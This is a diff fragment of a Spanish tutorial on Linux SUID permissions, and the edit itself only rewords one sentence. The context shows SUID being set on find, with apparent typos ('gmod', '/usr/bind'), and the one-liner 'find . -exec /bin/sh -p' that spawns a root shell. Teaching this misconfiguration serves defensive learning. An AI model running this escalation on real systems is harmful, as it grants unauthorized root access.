@@ -31,7 +31,7 @@ root> gmod 4755 /usr/bind/find
 
 ```
 
-Ahora en este caso se lo asignamos a ```find```, el problema de esto es que esto es vulnerable pues si aplicamos el siguiente comando, podremos obtener acceso como root:
+Ahora en este caso se lo asignamos a ```find```, el problema es que esto es vulnerable pues si aplicamos el siguiente comando, podremos obtener acceso como root:
 
 ```
 user@user:~$ find . -exec /bin/sh -p \; -quit
